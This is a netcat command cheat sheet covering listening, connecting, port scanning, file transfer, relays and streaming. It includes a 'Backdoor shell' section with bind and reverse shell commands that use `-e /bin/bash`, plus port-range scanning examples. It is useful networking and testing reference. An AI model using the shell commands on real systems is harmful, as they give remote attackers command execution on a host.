# Listen on a port (with TCP)
- `nc -l -p 9999` listen for inbound connection on a port
  - **NOTE** some variations of `nc` requires `-p` and some don't
- `nc -k -l 9999` continue listening after disconnection (from clients)
  - this also enables multiple clients connecting at the same time

# Connect to a port on another host (with TCP)
- `nc 10.0.2.10 port` connect to remote host and port

# Use UDP rather than TCP (with is default)
* `nc -u ...`

# Timeout
* `nc -w 10` terminate connection after 10 seconds

# Verbose
- `nc -v ....`
- `nc -vv ....` very verbose

# Port scan
* `nc -z 10.0.2.10 8080` report connection status only (can be used to test port open)
  * commonly used together with `-v`
  * e.g `nc -vz 10.0.2.10 8080`
  * `-z` means zero-i/o, zero payload
* `nc -z 10.0.2.10 1000-2000` scan port range

# Backdoor shell
## shell on listener
* on listener: `nc -v -l -p 5555 -e /bin/bash`
* on client: `nc -v host1 5555`
## shell on client
- on listener: `nc -l -p 5555`
- on client: `nc -v host1 5555 -e /bin/bash`

# transfer a file
## listener as receiver
* on listener: `nc -l -p 5555 > out.file`
* on sender: `nc host1 5555 < in.file`
## listener as sender
- on listener: `nc -l -p 5555 < in.file`
- on receiver: `nc host1 5555 > out.file`
## Encrypt
- `nc -l 8000 | openssl enc -d -des3 -pass pass:password > file.txt`
- `openssl enc -des3 -pass pass:password | nc 192.168.1.9 8000`

# transfer a directory
- server `tar -cvf – dir_name | nc -l 8000`
- client `nc -n 192.168.1.9 8000 | tar -xvf -`

# Relay (Reverse Proxy)
- on listener: `nc -lvvp 5555 | nc a-remote-host 6666`
  - or `nc -lp 5555 -c "nc a-remote-host 6666"`
- on client: `nc host1 5555`

# Streaming video
- server: `cat video.avi | nc -l 8000`
- client: `nc 192.168.1.9 8000 | mplayer -vo x11 -cache 3000 -`

# curl
  * `printf "GET / HTTP/1.0\r\n\r\n" | nc site-hostname 80`

  * `nc -c command`
  * `nc -e command`
